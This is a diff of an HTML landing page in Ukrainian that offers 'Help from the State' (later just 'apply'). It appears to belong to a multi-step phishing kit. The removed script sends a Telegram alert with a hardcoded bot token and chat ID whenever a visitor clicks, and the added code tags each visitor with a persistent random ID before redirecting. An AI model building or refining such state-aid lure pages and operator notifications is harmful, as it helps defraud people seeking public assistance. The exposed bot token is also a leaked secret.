@@ -3,33 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <title>Старт</title>
-
 <style>
 body{
   margin:0;
   font-family:Arial;
-  background:linear-gradient(135deg,#0f172a,#1e3a8a);
+  background:#0f172a;
   color:white;
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
 }
-
-.box{
-  text-align:center;
-  width:300px;
-}
-
+.box{text-align:center}
 button{
-  width:100%;
-  padding:14px;
+  padding:14px 20px;
   border:none;
   border-radius:10px;
   background:#3b82f6;
   color:white;
   font-size:16px;
-  cursor:pointer;
 }
 </style>
 </head>
@@ -37,29 +29,21 @@ button{
 <body>
 
 <div class="box">
-  <h1>Отримати</h1>
-  <p>Допомога від Держави</p>
-
-  <button onclick="start()">Отримати</button>
+  <h1></h1>
+  <p>Нажміть щоб подати заявку</p>
+  <button onclick="start()">Подати</button>
 </div>
 
 <script>
+let clientId = localStorage.getItem("clientId");
+
+if (!clientId) {
+  clientId = Math.floor(100000 + Math.random() * 900000);
+  localStorage.setItem("clientId", clientId);
+}
+
 function start(){
-
-  // BOT 1 — уведомление о входе
-  const token1 = "8590965261:AAEl5s04HGhShe2oFYLl4wFuCIomOGQ6cag";
-  const chat1 = "8035773808";
-
-  fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id:chat1,
-      text:"👤 переход по ссилке"
-    })
-  });
-
-  window.location.href = "step2.html";
+  window.location.href = "service.html";
 }
 </script>
 
